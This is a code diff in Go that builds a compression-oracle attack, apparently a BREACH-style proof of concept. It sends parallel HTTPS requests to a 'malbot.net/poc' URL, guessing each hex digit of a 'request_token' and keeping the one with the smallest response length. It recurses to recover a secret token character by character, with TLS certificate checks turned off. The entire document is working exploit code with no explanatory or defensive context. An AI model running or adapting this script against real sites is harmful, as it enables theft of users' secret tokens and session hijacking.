@@ -5,9 +5,13 @@ import "net/http"
 import "crypto/tls"
 import "strconv"
 
+type answer struct {
+     test string
+     l int64
+}
 
-func get_size(Url string, test string, padding string, c chan int64) {
-     final := Url + test + padding
+func get_size(Url string, token string, next string, padding string, c chan answer) {
+     final := Url + token + next + padding
      tr := &http.Transport{
             TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
      }
@@ -25,24 +29,29 @@ func get_size(Url string, test string, padding string, c chan int64) {
      if err != nil {
         log.Fatalln(err)
        }
-     c <- l	
+     c <- answer{next, l}
 }
 
-func try_many(Url string, Options [16]string, Padding string) {
-     ch := make(chan string, 16)
+func try_many(Url string, Options [16]string, Token string,Padding string) {
+     ch := make(chan answer, 16)
      for _, element := range Options {
-         go get_size(Url, element, Padding, ch)
+          go get_size(Url, Token, element, Padding, ch)
      }
+     min := answer{"", 888888}
+     for range Options {
+          a := <-ch
+          if a.l < min.l {
+               min = a
+          }
+     }
+     log.Println(Token + min.test)
+     try_many(Url, Options, Token + min.test, Padding)
 }
 
 func main() {
      Url := "https://malbot.net/poc/?request_token='"
+     log.Println(Url)
      Options := [16]string{"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f"}
-     /*test := "bb6"*/
      Padding := "{}{}{}{}{}{}{}"
-     ch := make(chan int64, 2)
-     go get_size(Url, Options[0], Padding, ch)
-     go get_size(Url, Options[11], Padding, ch)
-     log.Println(<-ch)
-     log.Println(<-ch)
+     try_many(Url, Options, "", Padding)
 }
